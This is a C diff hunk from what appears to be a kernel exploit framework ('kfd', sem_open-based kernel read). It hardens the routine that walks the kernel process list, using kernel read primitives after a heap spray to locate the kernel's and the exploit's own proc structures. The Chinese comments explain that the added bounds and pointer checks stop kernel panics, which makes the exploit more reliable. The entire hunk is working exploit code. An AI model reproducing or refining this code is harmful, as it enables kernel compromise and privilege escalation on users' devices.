@@ -94,24 +94,46 @@ void kread_sem_open_kread(struct kfd* kfd, u64 kaddr, void* uaddr, u64 size)
 
 void kread_sem_open_find_proc(struct kfd* kfd)
 {
+    if (!kfd->kread.krkw_object_uaddr) {
+        print_failure("find_proc: krkw_object_uaddr 为空，spray 没命中");
+        return;
+    }
+
     u64 pseminfo_kaddr = ((volatile struct psemnode*)(kfd->kread.krkw_object_uaddr))->pinfo;
     u64 semaphore_kaddr = kget_u64(pseminfo__psem_semobject, pseminfo_kaddr);
     u64 task_kaddr = kget_u64(semaphore__owner, semaphore_kaddr);
     u64 proc_kaddr = task_kaddr - kfd_offset(proc__object_size);
+
+    if ((proc_kaddr < 0xffff000000000000ULL) || (proc_kaddr == 0xffffffffffffffffULL)) {
+        print_failure("find_proc: 起点 proc 非法 (0x%llx)", proc_kaddr);
+        return;
+    }
+
     kfd->info.kaddr.kernel_proc = proc_kaddr;
 
     /*
      * Go backwards from the kernel_proc, which is the last proc in the list.
+     *
+     * 原始实现是 while (true) 且没有任何终止条件：只要 pid 一直匹配不上，
+     * 就会沿着 le_prev 一路读到野地址，内核缺页 -> 直接重启。
+     * 这里加上条数上限 + 指针合法性检查，找不到就干净退出。
      */
-    while (true) {
-        i32 pid = kget_u64(proc__p_pid, proc_kaddr);
+    for (u64 i = 0; i < 1024; i++) {
+        if ((proc_kaddr < 0xffff000000000000ULL) || (proc_kaddr == 0xffffffffffffffffULL)) {
+            print_failure("find_proc: 遍历到非法 proc (0x%llx)", proc_kaddr);
+            break;
+        }
+
+        i32 pid = (i32)kget_u64(proc__p_pid, proc_kaddr);
         if (pid == kfd->info.env.pid) {
             kfd->info.kaddr.current_proc = proc_kaddr;
-            break;
+            return;
         }
 
         proc_kaddr = kget_u64(proc__p_list__le_prev, proc_kaddr);
     }
+
+    print_failure("find_proc: 没找到自己的 proc (pid=%d)", kfd->info.env.pid);
 }
 
 void kread_sem_open_deallocate(struct kfd* kfd, u64 id)
